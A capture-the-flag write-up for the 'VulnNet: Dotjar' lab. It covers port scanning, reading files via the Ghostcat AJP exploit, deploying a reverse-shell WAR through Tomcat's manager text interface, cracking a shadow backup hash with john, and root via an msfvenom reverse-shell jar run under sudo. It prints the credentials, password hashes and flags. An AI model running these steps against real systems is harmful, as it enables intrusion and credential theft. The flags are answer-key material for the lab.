> VulnNet: Dotjar

# Nmap

nmap -sC -sV -T4 -Pn -vv -A -oN nmap/initial $IP

```bash
8009/tcp open     ajp13       syn-ack     Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open     http        syn-ack     Apache Tomcat 9.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.30
```

We can see that we have Tomcat but the version has no exploits and try to access `Manager App` and others requires authentication. Let's move onto port 8009 and hacktricks has great reference and it referred to `Ghostcat` exploit.
And looking for the exploit at github the 1st reference gave us a python exploit. Let's try reading `WEB-INF/web.xml` file as suggested in Hacktricks.

python3 exploit.py http://10.10.96.125:8080/ 8009 /WEB-INF/web.xml read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
 
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:Hgj3LA$02D$Fa@21
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>
```

## What we have here?

1. We have developer creds.
2. But no GUI access.

So let's try without GUI. /manager/html is the standard manager url, but /manager/text performs basically the same purpose without a gui! Sure enough, by accessing /manager/text/list I got a list of deployed applications. Let's upload a reverse shell to /manager/text/deploy and get a shell!

curl --user "webdev" --upload-file ilu.war http://10.10.96.125:8080/manager/text/deploy?path=/

And we have successfully uploaded a war file. Accessing `http://10.10.96.125:8080/ilu.war/` we got a shell as web!
While checking dirs like /opt and /var I got a weird one at /backups. 

```bash
-rw-r--r--  1 root root       485 Jan 16 13:44 shadow-backup-alt.gz
```

Let's move it to a remote location and view it.

```bash
cp shadow-backup-alt.gz /dev/shm
cd /dev/shm
gunzip shadow-backup-alt.gz
cat shadow-backup-alt

========================================================================================================== 
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
daemon:*:18642:0:99999:7:::
bin:*:18642:0:99999:7:::
sys:*:18642:0:99999:7:::
sync:*:18642:0:99999:7:::
games:*:18642:0:99999:7:::
man:*:18642:0:99999:7:::
lp:*:18642:0:99999:7:::
mail:*:18642:0:99999:7:::
news:*:18642:0:99999:7:::
uucp:*:18642:0:99999:7:::
proxy:*:18642:0:99999:7:::
www-data:*:18642:0:99999:7:::
backup:*:18642:0:99999:7:::
list:*:18642:0:99999:7:::
irc:*:18642:0:99999:7:::
gnats:*:18642:0:99999:7:::
nobody:*:18642:0:99999:7:::
systemd-network:*:18642:0:99999:7:::
systemd-resolve:*:18642:0:99999:7:::
syslog:*:18642:0:99999:7:::
messagebus:*:18642:0:99999:7:::
_apt:*:18642:0:99999:7:::
uuidd:*:18642:0:99999:7:::
lightdm:*:18642:0:99999:7:::
whoopsie:*:18642:0:99999:7:::
kernoops:*:18642:0:99999:7:::
pulse:*:18642:0:99999:7:::
avahi:*:18642:0:99999:7:::
hplip:*:18642:0:99999:7:::
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
==========================================================================================================
```

We got the shadow hashes. Let's crack them! I started with jdk-admin.

john --format=sha512crypt jdk-admin.hash --wordlist=/usr/share/wordlists/rockyou.txt

```bash
794613852        (jdk-admin)
```

# user.txt

```
THM{1ae87fa6ec2cd9f840c68cbad78e9351}
```

# Privilege Escalation

sudo -l

```bash
User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
```

Let's create a payload with msfvenom. 

msfvenom -p java/shell_reverse_tcp LHOST=10.8.107.21 LPORT=1337 -f jar > root.jar

And on running `sudo /usr/bin/java -jar root.jar` we got a shell as root.

# root.txt

```
THM{464c29e3ffae05c2e67e6f0c5064759c}
```